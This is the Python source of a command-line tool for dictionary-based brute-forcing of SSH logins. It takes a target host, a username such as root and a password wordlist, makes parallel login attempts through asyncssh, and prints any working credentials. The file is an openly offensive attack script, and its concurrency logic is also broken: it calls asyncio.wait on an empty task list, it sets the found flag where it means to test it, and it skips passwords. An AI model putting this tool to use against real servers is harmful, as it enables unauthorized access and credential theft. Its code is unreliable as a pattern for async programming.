"""Async SSH bruteforce tool

This tool performs asynchronous dictionary-based bruteforce attacks against 
SSH servers. It supports specifying target host, port, username and wordlist.
The tool utilizes asyncio for asynchronous concurrency and runs bruteforce 
attempts in parallel for faster results.

Usage:
  ssh_bruteforcer.py [-h] [-n NAME] [-p PORT] [-u USERNAME] -w WORDLIST target

  positional arguments:
    target                Host to attack e.g. 192.168.1.1

  optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --name NAME
  -p PORT, --port PORT
  -w WORDLIST, --wordlist WORDLIST
  -u USERNAME, --user USERNAME
                        Username which we want to bruteforce to
                          
Example:
  python ssh_bruteforcer.py 192.168.1.1 -u root -w passwords.txt
    
"""


import argparse 
from termcolor import colored,cprint 
import asyncio, asyncssh 
import os
from datetime import datetime 


def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("-n","--name", type=str)
    parser.add_argument("-p","--port", type=int,default=22)
    parser.add_argument("target",
                        help="Host to attack on e.g. 192.168.1.1")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                    required=True, type=str)
    parser.add_argument("-u","--user", dest='username',required=True
                        ,help="Username which we want to bruteforce to ")
    
    argument= parser.parse_args()
    
    return argument


async def main(hostname, port, username, wordlist):
    
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0
    
    with open(wordlist, 'r') as f:
        
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)
        for password in passwords:
            if counter >= concurrency_limit:
                await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                
                tasks =  []
                counter = 0
                
                if not found_flag.set():
                    tasks.append(asyncio.create_task(
                        ssh_bruteforce(hostname, username, password, port, found_flag)))    
                    
            await asyncio.sleep(0.01)
            
            counter += 1
                    
async def ssh_bruteforce(hostname, username, password, port, found_flag):
    try:
        async with asyncssh.connect(host=hostname, username=username, password=password, port=port) as conn:
            found_flag.set()
            print(colored(f"[+] Password Found -> login credential: {username}:{password}@{hostname}" , "green"))
    except Exception as err:
        print(
            f"[Attempt] target {hostname} - login:{username} - password:{password}")

if __name__ == "__main__":
    print(colored("\nAfshin Here!!!","green"))
    cprint("Welcome to my SSH Bruteforcer","blue")
    
    arguments = get_args()
    
    if not os.path.exists(arguments.wordlist):
        print(colored(
            "[-] Wordlist location is not right","red"))
        exit(1)
        
    print("--------------------------------------------------------\n--------------------------------------------------------")
    print(colored(f"[*] Target\t:", "magenta"), arguments.target)
    print(colored(f"[*] Username\t:", "magenta"), arguments.username)
    print(colored(
        f"[*] Port\t: ", "magenta"), end="")
    print('22' if not arguments.port else arguments.port)
    print(
        colored(f"[*] Wordlist\t: ", "magenta"), end="")
    print(arguments.wordlist)
    print(colored(f"[*] Protocol\t: ", "magenta"), end="")
    print("SSH")
    print("--------------------------------------------------------")
    
    print(colored(
        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("--------------------------------------------------------\n--------------------------------------------------------")
    asyncio.run(main(arguments.target, arguments.port,
                arguments.username, arguments.wordlist))
    
    